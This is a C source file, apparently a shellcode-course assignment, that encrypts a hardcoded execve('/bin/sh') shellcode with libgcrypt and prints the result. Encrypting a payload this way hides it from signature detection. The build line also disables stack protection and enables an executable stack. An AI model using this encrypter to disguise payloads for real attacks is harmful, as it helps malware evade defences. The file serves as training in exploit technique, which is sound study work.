/*
* SLAE Assigment 7 - Custom encrypter
* Author: rtmcx (rtmcx@protonmail.com)
* Encodes a shellcode with ase256 and key provided from the commandline
* 
   Must have libgcrypt installed, "sudo apt install libgcrypt20-dev"
   Compile with: 
        gcc -lgcrypt -fno-stack-protector -z execstack encoder.c -o encoder
*/


#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>

// Shellcode for Execve('/bin/sh')
uint8_t shellcode[] = 
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";//"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

uint8_t initVector[16] = {0x0A}; //Set the initialization vector

static void encrypter(int algorithm, size_t len, uint8_t *buffer, char* key){

    gcry_cipher_hd_t hd;
    gcry_cipher_open(&hd, algorithm, GCRY_CIPHER_MODE_OFB, 0);
    gcry_cipher_setkey(hd, key, 16);
    gcry_cipher_setiv(hd, initVector, 16);

    gcry_cipher_encrypt(hd, buffer, len, shellcode, len);
    gcry_cipher_close(hd);
}

int main(int argc, char* argv[])
{	
    if (argc < 2)
    {
        printf("[!] No key provided.\n");
        printf("usage: %s <KEY>\n", argv[0]);
        return 0;
    }
    char* key = argv[1];

    printf("Key: %s\n", key);
    int ag = gcry_cipher_map_name("aes256");

    printf("Encrypting shellcode using key '%s':\n", key);

    size_t len = strlen(shellcode);
    uint8_t *buffer = malloc(len);

    encrypter(ag, len, buffer, key);	

    // Print the encrypted shellcode    
    for(int i=0; i<len; i++){
    	printf("\\x%02x", buffer[i]);
    }

    printf("\n");
    free(buffer);
    return 0;
}
